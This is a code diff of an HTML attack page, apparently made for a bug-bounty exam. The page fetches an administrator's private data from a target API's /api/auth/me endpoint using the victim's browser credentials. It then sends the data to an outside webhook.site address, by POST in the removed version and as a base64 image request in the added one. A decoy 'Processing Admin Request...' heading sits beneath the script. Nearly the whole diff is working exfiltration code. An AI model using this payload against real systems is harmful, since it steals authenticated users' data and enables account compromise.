@@ -1,34 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        const myWebhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
-        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";
-
-        // Step 1: Steal the Admin's private data from the /me endpoint
-        fetch(targetApi, {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Step 2: Send that data to your webhook
-            fetch(myWebhook, {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({
-                    type: "ADMIN_ME_DUMP",
-                    content: data
-                })
-            });
-        })
-        .catch(err => {
-            fetch(myWebhook, {
-                method: "POST",
-                body: JSON.stringify({ error: err.message })
-            });
-        });
-    </script>
+   <script>
+    const webhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
+    
+    // Attempt to get the Admin's info
+    fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
+        credentials: "include"
+    })
+    .then(r => r.text()) // Use .text() to see the raw response
+    .then(data => {
+        // Encode the data to Base64 so it fits in a URL
+        const encoded = btoa(data).substring(0, 100); 
+        // Force the browser to "load an image" which is actually your webhook
+        new Image().src = webhook + "/?data=" + encoded;
+    })
+    .catch(err => {
+        new Image().src = webhook + "/?error=" + btoa(err.message);
+    });
+</script>
     <h1>Processing Admin Request...</h1>
 </body>
 </html>
